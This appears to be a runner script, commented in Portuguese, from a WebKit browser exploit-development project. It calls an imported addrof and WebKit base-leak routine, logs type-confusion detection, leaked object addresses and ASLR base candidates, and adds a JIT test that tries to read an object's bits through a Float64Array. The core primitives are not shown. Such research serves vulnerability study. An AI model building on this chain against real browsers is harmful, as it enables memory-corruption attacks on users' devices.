// js/script3/runAllAdvancedTestsS3.mjs (ATUALIZADO para Revisado 43 - WebKit Leak e com teste de JIT)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeTypedArrayVictimAddrofAndWebKitLeak_R43, 
    FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT
} from './testArrayBufferVictimCrash.mjs';
import { AdvancedInt64 } from '../utils.mjs'; // Importação para o teste de JIT

// NOVO CÓDIGO INSERIDO AQUI
async function testJITBehavior() {
    logS3("--- Iniciando Teste de Comportamento do JIT ---", 'test', 'testJITBehavior');
    let test_buf = new ArrayBuffer(16);
    let float_view = new Float64Array(test_buf);
    let uint32_view = new Uint32Array(test_buf);
    let some_obj = { a: 1, b: 2 }; // Um objeto qualquer

    logS3("Escrevendo um objeto em um Float64Array...", 'info', 'testJITBehavior');
    float_view[0] = some_obj;

    const low = uint32_view[0];
    const high = uint32_view[1];
    const leaked_val = new AdvancedInt64(low, high);
    
    logS3(`Bits lidos: high=0x${high.toString(16)}, low=0x${low.toString(16)} (Valor completo: ${leaked_val.toString(true)})`, 'leak', 'testJITBehavior');

    if (high === 0x7ff80000 && low === 0) {
        logS3("CONFIRMADO: O JIT converteu o objeto para NaN, como esperado.", 'good', 'testJITBehavior');
    } else {
        logS3("INESPERADO: O JIT não converteu para NaN. O comportamento é diferente do esperado.", 'warn', 'testJITBehavior');
    }
    logS3("--- Teste de Comportamento do JIT Concluído ---", 'test', 'testJITBehavior');
}
// FIM DO NOVO CÓDIGO

async function runHeisenbugReproStrategy_TypedArrayVictim_R43() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_R43"; 
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
    const result = await executeTypedArrayVictimAddrofAndWebKitLeak_R43();

    const module_name_for_title = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;

    if (result.errorOccurred) {
        logS3(`  RUNNER R43(L): Teste principal capturou ERRO: ${String(result.errorOccurred)}`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}: MainTest ERR!`;
    } else if (result) {
        logS3(`  RUNNER R43(L): Completou. Melhor OOB usado: ${result.oob_value_of_best_result || 'N/A'}`, "good", FNAME_RUNNER);
        logS3(`  RUNNER R43(L): Detalhes Sonda TC (Best): ${result.tc_probe_details ? JSON.stringify(result.tc_probe_details) : 'N/A'}`, "leak", FNAME_RUNNER);

        const heisenbugSuccessfullyDetected = result.heisenbug_on_M2_in_best_result;
        const addrofResult = result.addrof_result;
        const webkitLeakResult = result.webkit_leak_result;

        logS3(`  RUNNER R43(L): Heisenbug TC Sonda (Best): ${heisenbugSuccessfullyDetected ? "CONFIRMADA" : "NÃO CONFIRMADA"}`, heisenbugSuccessfullyDetected ? "vuln" : "warn", FNAME_RUNNER);

        if (addrofResult) {
            logS3(`  RUNNER R43(L): Teste Addrof (Best): ${addrofResult.msg} (Endereço vazado: ${addrofResult.leaked_object_addr || addrofResult.leaked_object_addr_candidate_str || 'N/A'})`, addrofResult.success ? "vuln" : "warn", FNAME_RUNNER);
        } else {
            logS3(`  RUNNER R43(L): Teste Addrof não produziu resultado ou não foi executado.`, "warn", FNAME_RUNNER);
        }

        if (webkitLeakResult) {
            logS3(`  RUNNER R43(L): Teste WebKit Base Leak (Best): ${webkitLeakResult.msg} (Base Candidata: ${webkitLeakResult.webkit_base_candidate || 'N/A'}, Ponteiro Interno Etapa2: ${webkitLeakResult.internal_ptr_stage2 || 'N/A'})`, webkitLeakResult.success ? "vuln" : "warn", FNAME_RUNNER);
        } else {
            logS3(`  RUNNER R43(L): Teste WebKit Base Leak não produziu resultado ou não foi executado.`, "warn", FNAME_RUNNER);
        }

        if (webkitLeakResult?.success) {
            document.title = `${module_name_for_title}_R43L: WebKitLeak SUCCESS!`;
        } else if (addrofResult?.success) {
            document.title = `${module_name_for_title}_R43L: Addrof OK, WebKitLeak Fail`;
        } else if (heisenbugSuccessfullyDetected) {
            document.title = `${module_name_for_title}_R43L: TC OK, Addrof/WebKitLeak Fail`;
        } else {
            document.title = `${module_name_for_title}_R43L: No TC Confirmed`;
        }

        if (result.iteration_results_summary && result.iteration_results_summary.length > 0) {
            logS3(`  RUNNER R43(L): Sumário completo das iterações:`, "info", FNAME_RUNNER);
            result.iteration_results_summary.forEach((iter_sum, index) => {
                const tcSuccess = iter_sum.heisenbug_on_M2_confirmed_by_tc_probe;
                const addrofSuccessThisIter = iter_sum.addrof_result_this_iter?.success ?? 'N/A'; 
                const addrofCandidateThisIter = iter_sum.addrof_result_this_iter?.leaked_object_addr_candidate_str ?? 'N/A';
                const webkitLeakSuccess = iter_sum.webkit_leak_result_this_iter?.success ?? 'N/A'; // WebKitLeak é por iteração agora
                let logMsg = `    Iter ${index + 1} (OOB ${iter_sum.oob_value}): TC=${tcSuccess}, AddrofIter=${addrofSuccessThisIter}`;
                if(addrofSuccessThisIter === false && addrofCandidateThisIter !== 'N/A') logMsg += ` (CandIter: ${addrofCandidateThisIter})`;
                logMsg += `, WebKitLeakIter=${webkitLeakSuccess}`; // Adicionado
                if(iter_sum.error) logMsg += `, Err: ${iter_sum.error}`;

                logS3(logMsg, "info", FNAME_RUNNER);
            });
        }
    } else {
        document.title = `${module_name_for_title}_R43L: Invalid Result Obj`;
    }
    logS3(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_MainOrchestrator`;
    logS3(`==== INICIANDO Script 3 R43L (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    
    // NOVO CÓDIGO INSERIDO AQUI
    await testJITBehavior(); // Executa o teste de isolamento primeiro
    await PAUSE_S3(500); // Pausa para ler o log do teste de JIT
    // FIM DO NOVO CÓDIGO
    
    await runHeisenbugReproStrategy_TypedArrayVictim_R43();
    logS3(`\n==== Script 3 R43L (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    const runBtn = getRunBtnAdvancedS3(); if (runBtn) runBtn.disabled = false;
    if (document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT) && !document.title.includes("SUCCESS") && !document.title.includes("Fail") && !document.title.includes("OK") && !document.title.includes("Confirmed")) {
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_R43L Done`;
    }
}
